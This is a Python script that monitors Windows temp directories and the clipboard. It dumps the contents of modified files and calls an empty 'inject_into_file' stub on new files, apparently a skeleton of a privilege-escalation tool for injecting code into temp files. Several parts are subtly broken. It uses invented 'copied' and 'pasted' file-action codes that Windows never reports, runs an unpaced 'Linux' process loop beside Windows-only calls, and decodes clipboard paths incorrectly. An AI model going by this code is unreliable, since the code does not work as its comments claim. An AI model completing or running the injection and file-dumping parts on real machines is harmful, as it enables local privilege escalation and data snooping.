import os
import tempfile
import threading
import win32con
import win32file
import win32clipboard
import time
import psutil  # Process and system utilities (for Linux process monitoring)

# Define constants for file actions
FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5
FILE_COPIED = 8  # Custom action for file copy
FILE_PASTED = 9  # Custom action for file paste

# Define constant for monitoring file system changes
FILE_LIST_DIRECTORY = 0x0001

# Directories to monitor
PATHS = ['c:\\WINDOWS\\Temp', tempfile.gettempdir()]

# Global variables to store copied and pasted file paths
copied_file_path = None
pasted_file_path = None

def monitor_windows(path_to_watch):
    """Monitor file changes on Windows."""
    # Create a file handle to the directory for monitoring
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE |
        win32con.FILE_SHARE_DELETE,  # Share mode for other processes
        None,  # Security attributes (None for default)
        win32con.OPEN_EXISTING,  # Open an existing file or device
        win32con.FILE_FLAG_BACKUP_SEMANTICS,  # Flag for directory access
        None  # Template file (None for directories)
    )

    while True:
        try:
            # Read directory changes
            results = win32file.ReadDirectoryChangesW(
                h_directory,  # Directory handle
                1024,  # Buffer size
                True,  # Watch subtree (True for all subdirectories)
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY |
                win32con.FILE_NOTIFY_CHANGE_SIZE,  # Change filter flags
                None,  # Asynchronous I/O event (None for synchronous)
                None  # Overlapped structure (None for synchronous)
            )

            for action, file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)

                # Handle different file actions
                if action == FILE_CREATED:
                    print(f'[+] Created {full_filename}')
                    inject_into_file(full_filename)
                elif action == FILE_DELETED:
                    print(f'[-] Deleted {full_filename}')
                elif action == FILE_MODIFIED:
                    print(f'[*] Modified {full_filename}')
                    try:
                        print('[vvv] Dumping contents ...')
                        with open(full_filename) as f:
                            contents = f.read()
                        print(contents)
                        print('[^^^] Dump Complete.')
                    except Exception as e:
                        print(f'[!!!] Dump Failed {e}')
                elif action == FILE_RENAMED_FROM:
                    print(f'[>] Renamed from {full_filename}')
                elif action == FILE_RENAMED_TO:
                    print(f'[<] Renamed to {full_filename}')
                elif action == FILE_COPIED:
                    print(f'[+] Copied {full_filename}')
                    global copied_file_path
                    copied_file_path = full_filename
                elif action == FILE_PASTED:
                    print(f'[+] Pasted {full_filename}')
                    global pasted_file_path
                    pasted_file_path = full_filename
                else:
                    print(f'[?] Unknown action on {full_filename}')
        except Exception:
            pass

def monitor_linux():
    """Monitor processes and file activities on Linux."""
    while True:
        for proc in psutil.process_iter(['pid', 'name']):
            print(f'[+] Process: {proc.pid} - {proc.info["name"]}')
        # Add code here to monitor file activities on Linux

def monitor_clipboard():
    """Monitor clipboard for file paste actions."""
    global copied_file_path
    global pasted_file_path

    # Function to check clipboard for file paste
    def check_clipboard():
        while True:
            try:
                win32clipboard.OpenClipboard(0)  # Open clipboard
                clipboard_data = win32clipboard.GetClipboardData(win32clipboard.CF_HDROP)  # Get clipboard data
                win32clipboard.CloseClipboard()  # Close clipboard

                # Check if clipboard data contains a single file path
                if clipboard_data and len(clipboard_data) == 1:
                    global pasted_file_path
                    pasted_file_path = clipboard_data[0].decode('utf-8')
                    print(f'[+] Pasted from clipboard: {pasted_file_path}')
            except Exception as e:
                print(f'Error monitoring clipboard: {e}')
            finally:
                time.sleep(1)

    # Start clipboard monitoring thread
    clipboard_thread = threading.Thread(target=check_clipboard)
    clipboard_thread.daemon = True  # Daemonize the thread
    clipboard_thread.start()  # Start the thread

def inject_into_file(file_path):
    """Inject the script into the file."""
    # Add code here to inject the script into the specified file
    pass

if __name__ == '__main__':
    # Start monitoring on Windows
    for path in PATHS:
        monitor_thread = threading.Thread(target=monitor_windows, args=(path,))
        monitor_thread.start()  # Start monitoring thread

    # Start monitoring on Linux
    monitor_thread_linux = threading.Thread(target=monitor_linux)
    monitor_thread_linux.start()  # Start monitoring thread

    # Start monitoring clipboard for paste actions on Windows
    monitor_clipboard()
